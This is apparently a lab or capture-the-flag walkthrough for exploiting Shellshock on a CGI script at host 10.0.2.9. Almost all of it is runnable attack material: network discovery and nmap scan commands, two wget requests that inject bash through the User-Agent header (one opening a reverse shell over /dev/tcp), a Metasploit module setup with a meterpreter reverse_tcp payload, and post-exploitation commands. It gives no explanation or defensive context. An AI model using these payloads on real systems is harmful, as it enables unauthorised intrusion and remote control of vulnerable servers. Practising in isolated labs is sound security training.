## Attacker dependencies 
- arp-scan
- nmap 
- nikto 
- metasploit
- 
## Commands 
- sudo arp-scan -local
- nmap -p- -sV 10.0.2.9
- wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'echo vulnerable'" http://10.0.2.9/cgi-bin/status
- wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -i >& /dev/tcp/10.0.2.9/5555 0>&1" http://10.0.2.9/cgi-bin/status


## msfconsole
- search shellshock
- use exploit/multi/http/apache_mod_cgi_bash_env_exec
- set rhosts 10.0.2.9
- set TARGETURI /cgi-bin/status
- check
- show payloads
- set payload linux/x86/meterpreter/reverse_tcp
- exploit

### When inside
getuid
pwd
ifconfig
sysinfo
shell











